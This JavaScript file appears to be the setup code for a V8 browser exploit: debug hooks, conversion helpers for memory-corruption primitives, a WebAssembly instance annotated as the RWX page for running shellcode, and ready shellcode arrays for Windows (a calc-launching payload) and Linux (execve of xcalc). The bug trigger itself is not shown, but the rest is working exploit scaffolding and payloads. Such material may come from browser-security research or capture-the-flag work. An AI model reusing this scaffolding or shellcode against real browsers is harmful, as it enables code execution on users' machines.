function sleep(delay) {
    for (var t = Date.now(); Date.now() - t <= delay;);
}

var DEBUG = 0
if (DEBUG) {
    eval("function dp(x) {  %DebugPrint(x); }function bp() { %SystemBreak(); }");
    print = console.log;
} else {
    dp = () =>{};
    bp = () =>{};
    print = () => { };
}

const assert = function (b, msg) {
    if (!b)
        throw Error(msg);
};
const hex = (x) => ("0x" + x.toString(16));
function gc() {
    for (var i = 0; i < 0x80000; ++i) {
        var a = new ArrayBuffer();
    }
}

function getWasm(){

    var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11])
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;
    return [wasm_instance,f]; // rwx_page = *(u64*)(addrof(wasm_instance)+0x68), f() => exec shellcode(in sandbox)
}

var shellcode_windows_bp = [0x90909090, 0x03cd];
var shellcode_windows_calc = [3833809148, 12642544, 1363214336, 1364348993, 3526445142, 1384859749, 1384859744, 1384859672, 1921730592, 3071232080, 827148874, 3224455369, 2086747308, 1092627458, 1091422657, 3991060737, 1213284690, 2334151307, 21511234, 2290125776, 1207959552, 1735704709, 1355809096, 1142442123, 1226850443, 1457770497, 1103757128, 1216885899, 827184641, 3224455369, 3384885676, 3238084877, 4051034168, 608961356, 3510191368, 1146673269, 1227112587, 1097256961, 1145572491, 1226588299, 2336346113, 21530628, 1096303056, 1515806296, 1497454657, 2202556993, 1379999980, 1096343807, 2336774745, 4283951378, 1214119935, 442, 0, 2374846464, 257, 2335291969, 3590293359, 2729832635, 2797224278, 4288527765, 3296938197, 2080783400, 3774578698, 1203438965, 1785688595, 2302761216, 1674969050, 778267745, 6649957];
var shellcode_linux_bp = [0xcccccccc, 0xdeadbeef];
var shellcode_linux_xcalc = [0x90909090, 0x90909090, 0x782fb848, 0x636c6163, 0x48500000, 0x73752fb8, 0x69622f72, 0x8948506e, 0xc03148e7, 0x89485750, 0xd23148e6, 0x3ac0c748, 0x50000030, 0x4944b848, 0x414c5053, 0x48503d59, 0x3148e289, 0x485250c0, 0xc748e289, 0x00003bc0, 0x050f00];

var shellcode = shellcode_windows_bp;
var shellcode_maxsize = 0x2000;

const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2ua(val) { //double ==> Uint32 array [low, high]
    __dvCvt.setFloat64(0, val, true);
    return [__dvCvt.getUint32(0, true),
    __dvCvt.getUint32(4, true)];
}
function d2u(val) { //double ==> Uint64
    __dvCvt.setFloat64(0, val, true);
    return __dvCvt.getUint32(0, true) +
        __dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val) { //Uint64 ==> double
    const tmp0 = val % 0x100000000;
    __dvCvt.setUint32(0, tmp0, true);
    __dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
    return __dvCvt.getFloat64(0, true);
}
function ua2d(val) { //Uint32 array ==> double
    __dvCvt.setUint32(0, val[0], true);
    __dvCvt.setUint32(4, val[1], true);
    return __dvCvt.getFloat64(0, true);
}

function dLow(f) {
    __dvCvt.setFloat64(0, f, true);
    return (__dvCvt.getUint32(0, true));
}
function dHi(f) {
    __dvCvt.setFloat64(0, f, true);
    return (__dvCvt.getUint32(4, true));
}
